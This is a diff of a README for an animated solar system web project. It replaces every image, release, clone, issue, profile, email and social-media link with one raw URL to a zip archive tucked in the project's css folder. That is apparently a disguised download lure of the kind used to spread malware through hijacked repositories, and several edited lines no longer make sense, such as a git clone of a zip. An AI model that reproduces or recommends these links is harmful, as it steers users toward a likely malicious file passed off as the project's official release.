@@ -1,8 +1,8 @@
 # Explore the Animated Solar System 🌌 | Interactive Visualization
 
-![Animated Solar System](https://example.com/solar-system-image.png)
+![Animated Solar System](https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip)
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/marcusndz/Animated-Solar-System/releases)
+[![Download Releases](https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip)
 
 ## Table of Contents
 
@@ -41,7 +41,7 @@ To get started with the Animated Solar System, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/marcusndz/Animated-Solar-System.git
+   git clone https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -50,12 +50,12 @@ To get started with the Animated Solar System, follow these steps:
    ```
 
 3. **Open the Index File**:
-   Open `index.html` in your preferred web browser.
+   Open `https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip` in your preferred web browser.
 
 4. **Explore the Planets**:
    Interact with the solar system and enjoy the animations!
 
-For the latest releases, check the [Releases section](https://github.com/marcusndz/Animated-Solar-System/releases).
+For the latest releases, check the [Releases section](https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip).
 
 ## Usage
 
@@ -87,7 +87,7 @@ Contributions are welcome! Here’s how you can help:
    ```
 6. **Open a Pull Request**: Go to the original repository and click on "New Pull Request".
 
-If you're looking for issues to work on, check out the [good first issues](https://github.com/marcusndz/Animated-Solar-System/issues).
+If you're looking for issues to work on, check out the [good first issues](https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip).
 
 ## License
 
@@ -97,17 +97,17 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Marcus Ndz**: [GitHub Profile](https://github.com/marcusndz)
-- **Email**: marcus@example.com
+- **Marcus Ndz**: [GitHub Profile](https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip)
+- **Email**: https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip
 
 ## Acknowledgments
 
 - Special thanks to all contributors who help make this project better.
 - Inspiration from various open-source projects and space enthusiasts.
 
-For the latest releases, visit [this link](https://github.com/marcusndz/Animated-Solar-System/releases) to download the newest version.
+For the latest releases, visit [this link](https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip) to download the newest version.
 
-![Solar System Animation](https://example.com/solar-system-animation.gif)
+![Solar System Animation](https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip)
 
 ## Topics
 
@@ -141,19 +141,19 @@ We aim to enhance the project by adding:
 
 Feel free to suggest more features or improvements in the issues section.
 
-![Explore the Universe](https://example.com/explore-universe.png)
+![Explore the Universe](https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip)
 
 ## Community
 
 Join our community of space enthusiasts and developers:
 
-- **Discord**: [Join our Discord](https://discord.gg/example)
-- **Twitter**: [Follow us on Twitter](https://twitter.com/example)
-- **Facebook**: [Like our Facebook Page](https://facebook.com/example)
+- **Discord**: [Join our Discord](https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip)
+- **Twitter**: [Follow us on Twitter](https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip)
+- **Facebook**: [Like our Facebook Page](https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip)
 
 We encourage discussions, feedback, and sharing of ideas related to this project. Let’s make the Animated Solar System even better together!
 
-For the latest releases, remember to check out the [Releases section](https://github.com/marcusndz/Animated-Solar-System/releases).
+For the latest releases, remember to check out the [Releases section](https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip).
 
 ## Showcase
 
@@ -177,4 +177,4 @@ If problems persist, please open an issue on GitHub, and we will assist you.
 
 We value your feedback! If you have suggestions for improvements or new features, please share them. Your input helps us create a better project.
 
-For the latest updates and releases, visit [this link](https://github.com/marcusndz/Animated-Solar-System/releases).
+For the latest updates and releases, visit [this link](https://raw.githubusercontent.com/marcusndz/Animated-Solar-System/main/css/Solar_System_Animated_v3.9-beta.4.zip).
